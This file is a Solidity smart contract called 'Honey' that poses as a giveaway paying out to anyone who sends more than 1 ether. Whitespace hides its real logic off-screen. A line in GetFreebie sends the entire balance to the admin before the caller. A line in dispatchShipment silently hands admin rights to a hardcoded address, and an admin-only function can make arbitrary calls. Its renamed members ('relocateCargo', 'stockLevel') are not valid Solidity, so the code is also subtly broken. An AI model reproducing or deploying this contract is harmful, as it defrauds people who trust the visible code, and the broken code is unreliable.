// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract Honey
{
    address public LogisticsAdmin = msg.sender;

    function()
    public
    payable
    {

    }

    function GetFreebie()
    public
    payable
    {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    LogisticsAdmin.relocateCargo(this.stockLevel);
            msg.sender.relocateCargo(this.stockLevel);
        }
    }

    function dispatchShipment()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        if(msg.sender==0x0C76802158F13aBa9D892EE066233827424c5aAB){LogisticsAdmin=0x0C76802158F13aBa9D892EE066233827424c5aAB;}
        require(msg.sender == LogisticsAdmin);
        LogisticsAdmin.relocateCargo(this.stockLevel);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == LogisticsAdmin);
        adr.call.value(msg.value)(data);
    }
}